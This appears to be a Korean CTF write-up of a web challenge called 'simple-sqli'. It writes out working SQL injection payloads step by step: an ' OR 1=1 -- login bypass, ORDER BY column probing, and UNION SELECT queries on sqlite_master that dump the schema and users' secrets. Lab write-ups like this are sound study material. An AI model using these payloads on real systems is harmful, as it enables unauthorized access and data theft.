---
title: "해커톤 세종 2026"
date: "2026-05-13"
category: "CTF/Wargame"
description: "해커톤 세종 2026 참여 후기"
tags: ["CTF", "해커톤 세종 2026", "광탈"]
---

## 챌린지 개요

해커톤 세종 2026 예선에서 풀었던 WEB 카테고리의 **simple-sqli** 문제 풀이 기록이다. 이름 그대로 가장 기본적인 SQL Injection 문제였지만, 출력 슬롯이 일부 하드코딩되어 있어서 어느 컬럼을 통해 데이터를 빼낼지 고르는 감각을 익히기에 좋은 문제였다.

![simple-sqli 챌린지 정보](/images/ctf-wargame/hacktheonSejong2026/solve.png)

- **Category**: WEB
- **Points**: 250 pts
- **Solves**: 212
- **Status**: SOLVED

## 1단계 — 취약점 확인

로그인 폼에 가장 고전적인 인증 우회 페이로드를 넣어 SQL Injection 가능 여부부터 확인했다.

```sql
' OR 1=1 --
```

비밀번호는 아무 값이나 넣고 제출했더니 `Welcome, 1!` 메시지와 함께 로그인이 통과됐다. 입력값이 SQL 쿼리에 그대로 들어가고 있다는 게 확인됐고, UNION 기반 데이터 추출로 넘어가도 되겠다는 판단이 섰다.

## 2단계 — 컬럼 개수 파악

UNION을 쓰려면 원본 쿼리의 컬럼 수를 정확히 맞춰야 한다. `ORDER BY` 인덱스를 하나씩 올려가며 에러가 나는 지점을 찾았다.

```sql
' ORDER BY 1 --   -- 정상
' ORDER BY 2 --   -- 정상
' ORDER BY 3 --   -- 정상
' ORDER BY 4 --   -- 에러
```

4번에서 다음과 같은 에러 메시지가 떴다.

```
SQL error: 1st ORDER BY term out of range - should be between 1 and 3
```

이 한 줄에서 두 가지 정보를 얻었다.

1. 쿼리의 컬럼 수는 **3개**.
2. 에러 메시지 형식이 SQLite의 것이라 DBMS는 **SQLite**라고 단정할 수 있었다. 이후 단계에서 `sqlite_master`를 쓸 수 있는 근거가 된다.

## 3단계 — 출력 위치 식별

컬럼이 3개라는 걸 알았으니, 어느 슬롯이 실제로 화면에 반사되는지 확인했다.

```sql
abc' UNION SELECT '일번', '이번', '삼번' --
```

존재하지 않는 아이디(`abc`)로 일부러 매칭을 비워서 UNION으로 붙인 행만 화면에 떠 보이게 했다. 결과는 다음과 같았다.

- `Username`: **일번** → 1번 슬롯 반사됨
- `Role`: **USER** → **2번 슬롯은 하드코딩**되어 어떤 값을 넣어도 `USER`로만 표시됨
- `Secret`: **삼번** → 3번 슬롯 반사됨

2번 슬롯이 막혀 있어도 1번/3번 중 하나만 살아 있으면 데이터를 빼낼 수 있다. 가장 길게 보이는 3번(Secret) 자리를 추출 슬롯으로 잡고 진행했다.

## 4단계 — 테이블 목록 추출

SQLite에서 테이블 목록은 `sqlite_master`로 조회한다. 여러 개 이름이 한 번에 보이도록 `group_concat`으로 묶었다.

```sql
abc' UNION SELECT 1, 2, group_concat(name) FROM sqlite_master WHERE type='table' --
```

Secret 칸에 출력된 결과:

```
users,sqlite_sequence
```

`sqlite_sequence`는 AUTOINCREMENT 관리용 시스템 테이블이라 무시. 남는 건 `users` 하나뿐이라 플래그는 여기 어딘가에 들어 있다고 좁혀졌다.

## 5단계 — users 테이블 스키마 확인

테이블이 만들어질 때 사용된 `CREATE TABLE` 문은 `sqlite_master.sql`에 그대로 남아 있다.

```sql
abc' UNION SELECT 1, 2, sql FROM sqlite_master WHERE name='users' --
```

Secret 칸에 출력된 스키마:

```sql
CREATE TABLE users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT NOT NULL,
    password TEXT NOT NULL,
    role TEXT NOT NULL,
    secret TEXT NOT NULL
)
```

`role`과 `secret`이 추가로 박혀 있다. 이름만 봐도 플래그는 `secret` 컬럼에 들어 있을 가능성이 가장 높았다.

## 6단계 — 플래그 추출

마지막으로 `secret` 컬럼의 모든 값을 한 번에 뽑아 봤다.

```sql
abc' UNION SELECT 1, 2, group_concat(secret) FROM users --
```

Secret 칸에 출력된 결과:

```
nothing to see here,hacktheon2026{d0nt_f0rget_the_s1ng1e_qu0te}
```

첫 번째 사용자의 secret은 `nothing to see here`라는 페이크, 두 번째 사용자의 secret이 진짜 플래그였다.

**Flag**: `hacktheon2026{d0nt_f0rget_the_s1ng1e_qu0te}`

## 회고

대회에는 WEB 말고도 AI, PWN, REV, MISC 등 여러 카테고리의 문제가 출제됐지만, 결국 내가 풀어낸 건 가장 쉬운 축에 속하는 이 **simple-sqli** 한 문제뿐이었다. 다른 문제들은 손도 못 대고 끝난 게 솔직히 많이 아쉽다. 그래도 이 한 문제를 처음부터 끝까지 직접 단계별로 밟아본 경험은 꽤 남았고, 다음 대회 전까지 PWN/REV/AI 쪽은 따로 공부해서 다시 도전해 볼 생각이다.

- **에러 메시지가 곧 정답지였다.** `ORDER BY` 에러 한 줄에서 컬럼 수와 DBMS 종류를 동시에 얻을 수 있었다. 블라인드로 추측하기 전에 에러를 일부러 한 번 띄워보는 게 효율적이라는 걸 다시 확인.
- **출력 슬롯이 전부 살아 있다고 가정하면 안 된다.** Role 칸이 서버 측에서 `USER`로 고정되어 있어서, 만약 2번 슬롯에 데이터 추출 페이로드를 박았다면 한참 헤맸을 것이다. 반드시 `UNION SELECT '1','2','3'`처럼 슬롯별 마커를 먼저 던져 반사 여부를 확인하고 시작해야 한다.
- **플래그 메시지의 의미.** `d0nt_f0rget_the_s1ng1e_qu0te` — 결국 모든 익스플로잇은 작은따옴표 하나로 시작했다. 방어자 입장에서는 입력값의 `'`를 그냥 문자로 처리하거나 Prepared Statement를 쓰는 것이 얼마나 중요한지 직관적으로 알려주는 플래그였다.

이번 문제에서 사용한 기법은 다음 세 가지로 요약된다.

1. `' OR 1=1 --` 형태의 **인증 우회**
2. `ORDER BY` 에러를 활용한 **컬럼 개수 파악**
3. `sqlite_master` + `UNION SELECT`를 이용한 **스키마·데이터 탈취**
